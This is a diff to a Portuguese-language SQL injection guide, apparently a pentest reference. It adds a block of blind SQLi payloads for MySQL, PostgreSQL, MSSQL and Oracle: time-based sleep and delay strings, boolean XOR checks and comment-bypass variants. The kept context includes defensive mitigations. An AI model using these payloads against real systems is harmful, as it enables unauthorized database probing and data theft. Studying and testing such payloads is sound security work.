@@ -110,6 +110,41 @@ CHAR(39)||CHAR(79)||CHAR(82)
 ' UNION SELECT NULL FROM dual-- -
 ```
 
+Blind SQLi avancado (por DBMS):
+```sql
+-- MySQL (time-based avancado)
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+(SELECT(0)FROM(SELECT(SLEEP(5)))a)
+'%2b(select*from(select(sleep(5)))a)%2b'
+BENCHMARK(10000000,MD5(CHAR(116)))
+1 AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE '%')
+
+-- PostgreSQL (time-based avancado)
+SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
+');(SELECT 4564 FROM PG_SLEEP(5))--
+1 OR (SELECT pg_sleep(25) FROM pg_catalog.pg_class LIMIT 1)--
+
+-- MSSQL (time-based avancado)
+WAITFOR DELAY '0:0:25';--
+WAITFOR DELAY '0:0:25' and 'a'='a;--
+1;WAITFOR DELAY '0:0:5'--
+
+-- Oracle (time-based avancado)
+DBMS_PIPE.RECEIVE_MESSAGE([INT],5)
+DBMS_LOCK.SLEEP(25);
+1 AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--
+
+-- Boolean-based com diferenca de tamanho de resposta
+"XOR(if((select/**/666/**/where/**/1=1),444,0))XOR"
+"XOR(if((select/**/666/**/where/**/1=2),444,0))XOR"
+
+-- Comment bypass
+/**/xor/**/sleep(25)
+//xor//sleep(25)
+' AND(SELECT 1 FROM(SELECT SLEEP(5))a)-- -
+```
+
 Casos reais e mentalidade de ataque (RWBH): Yahoo (busca/filtros) e Uber (APIs internas) mostram injeção em `ORDER BY`, filtros e relatórios, não apenas no login; o atacante começa por erros e boolean, depois time-based e UNION.
 
 ## Target Context (Crawler Hints)
@@ -174,3 +209,6 @@ ps.setString(1, email);
 7. Mascarar erros de banco e não retornar stack traces.
 8. Auditar queries e alertar sobre padrões (`UNION`, `SLEEP`, comentários) e picos de erro.
 9. Testar com sqlmap em ambiente autorizado e cobrir regressão com testes que tentem payloads clássicos.
+
+## Sources
+- Colecao de payloads Blind SQLi (blindsqli.txt) -- 96 payloads cobrindo time-based (MySQL/PostgreSQL/MSSQL/Oracle), boolean-based e comment bypass.
